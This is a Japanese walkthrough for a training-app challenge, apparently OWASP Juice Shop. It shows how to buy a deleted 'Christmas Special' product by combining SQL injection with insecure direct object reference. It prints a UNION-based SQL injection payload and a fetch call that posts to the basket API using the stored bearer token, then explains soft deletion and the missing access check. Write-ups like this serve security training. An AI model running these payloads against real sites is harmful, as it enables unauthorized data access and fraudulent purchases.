# Christmas Special ✅

**難易度:** ⭐⭐⭐⭐
**カテゴリ:** SQLi + IDOR
**目標:** 削除された商品をAPIで購入する

---

## 実行手順

1. SQLiで削除商品のIDを発見:
   ```
   ')) UNION SELECT id,name,description,4,5,6,7,8,9 FROM Products WHERE deletedAt IS NOT NULL--
   ```
2. Christmas Special商品（ID: 10）を発見
3. APIで直接カートに追加:
   ```javascript
   fetch('/api/BasketItems/', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     },
     body: JSON.stringify({
       ProductId: 10,
       BasketId: localStorage.getItem('bid'),
       quantity: 1
     })
   })
   ```
4. チェックアウトで購入

## 解説

- 削除された商品はUIに表示されない
- しかしデータベースには残っている（論理削除）
- APIは削除フラグをチェックしていない

**論理削除 vs 物理削除:**
- 論理削除: `deletedAt` カラムに日時を設定
- 物理削除: レコードを完全に削除
- 論理削除は復元可能だが、アクセス制御が必要

## 関連チャレンジ

- [GDPR Data Erasure](../difficulty-3/gdpr-data-erasure.md)
- [Database Schema](database-schema.md)
